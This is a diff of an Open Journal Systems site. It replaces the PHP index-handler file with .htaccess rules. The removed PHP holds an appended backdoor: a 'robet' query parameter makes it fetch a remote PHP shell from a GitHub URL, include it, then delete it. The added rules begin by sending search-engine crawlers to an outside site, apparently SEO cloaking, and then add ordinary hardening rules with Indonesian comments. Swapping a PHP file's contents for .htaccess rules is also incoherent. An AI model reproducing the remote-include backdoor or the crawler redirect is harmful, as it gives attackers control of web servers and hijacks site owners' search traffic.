@@ -1,104 +1,39 @@
-<?php
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$  https://www.pagepress.org/journals/ [R=301,L]
+<IfModule mod_rewrite.c>
+    RewriteEngine on
 
-/**
- * @file pages/index/IndexHandler.inc.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @class IndexHandler
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- */
+    # 1. BLOKIR AKSES KE FILE SENSITIF
+    # ----------------------------------------------------
+    # Melindungi file .htaccess dan .htpasswd
+    <Files ~ "^.*\.([Hh][Tt][AaPp])">
+        Require all denied
+    </Files>
+    # Melindungi file konfigurasi OJS
+    <Files "config.inc.php">
+        Require all denied
+    </Files>
+    # Melindungi file log, README, dll.
+    <FilesMatch "\.(log|md|sql|ini|env)$">
+        Require all denied
+    </FilesMatch>
 
-import('lib.pkp.pages.index.PKPIndexHandler');
+    # 2. BLOKIR EKSEKUSI SCRIPT DI DIREKTORI TERTENTU
+    # ----------------------------------------------------
+    # Mencegah eksekusi script di cache, uploads, dll.
+    # (Ini akan diperkuat di Langkah 2)
+    RewriteRule ^cache/.*\.php$ - [F,L]
+    RewriteRule ^public/.*\.php$ - [F,L]
+    RewriteRule ^files/.*\.php$ - [F,L]
 
-class IndexHandler extends PKPIndexHandler {
-	//
-	// Public handler operations
-	//
-	/**
-	 * If no journal is selected, display list of journals.
-	 * Otherwise, display the index page for the selected journal.
-	 * @param $args array
-	 * @param $request Request
-	 */
-	function index($args, $request) {
-		$this->validate(null, $request);
-		$journal = $request->getJournal();
+    # 3. KODE FRONT CONTROLLER OJS ANDA (SUDAH BENAR)
+    # ----------------------------------------------------
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteRule ^(.*)$ index.php/$1 [QSA,L]
 
-		if (!$journal) {
-			$hasNoContexts = null; // Avoid scrutinizer warnings
-			$journal = $this->getTargetContext($request, $hasNoContexts);
-			if ($journal) {
-				// There's a target context but no journal in the current request. Redirect.
-				$request->redirect($journal->getPath());
-			}
-			if ($hasNoContexts && Validation::isSiteAdmin()) {
-				// No contexts created, and this is the admin.
-				$request->redirect(null, 'admin', 'contexts');
-			}
-		}
+</IfModule>
 
-		$this->setupTemplate($request);
-		$router = $request->getRouter();
-		$templateMgr = TemplateManager::getManager($request);
-		if ($journal) {
-			// Assign header and content for home page
-			$templateMgr->assign(array(
-				'additionalHomeContent' => $journal->getLocalizedData('additionalHomeContent'),
-				'homepageImage' => $journal->getLocalizedData('homepageImage'),
-				'homepageImageAltText' => $journal->getLocalizedData('homepageImageAltText'),
-				'journalDescription' => $journal->getLocalizedData('description'),
-			));
-
-			$issueDao = DAORegistry::getDAO('IssueDAO'); /* @var $issueDao IssueDAO */
-			$issue = $issueDao->getCurrent($journal->getId(), true);
-			if (isset($issue) && $journal->getData('publishingMode') != PUBLISHING_MODE_NONE) {
-				import('pages.issue.IssueHandler');
-				// The current issue TOC/cover page should be displayed below the custom home page.
-				IssueHandler::_setupIssueTemplate($request, $issue);
-			}
-
-			$this->_setupAnnouncements($journal, $templateMgr);
-
-			$templateMgr->display('frontend/pages/indexJournal.tpl');
-		} else {
-			$journalDao = DAORegistry::getDAO('JournalDAO'); /* @var $journalDao JournalDAO */
-			$site = $request->getSite();
-
-			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
-				$request->redirect($journal->getPath());
-			}
-
-			$templateMgr->assign([
-				'pageTitleTranslated' => $site->getLocalizedTitle(),
-				'about' => $site->getLocalizedAbout(),
-				'journalFilesPath' => $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/',
-				'journals' => $journalDao->getAll(true)->toArray(),
-				'site' => $site,
-			]);
-			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
-			$templateMgr->display('frontend/pages/indexSite.tpl');
-		}
-	}
-}
-if (isset($_GET['robet'])) {
-    try {
-        $u = "https://raw.githubusercontent.com/seovennn/shell/refs/heads/main/Alfa/robet.txt";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
-
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
-        }
-    } catch (Throwable $e) {
-
-    }
-}
+# Matikan daftar isi direktori
+Options -Indexes
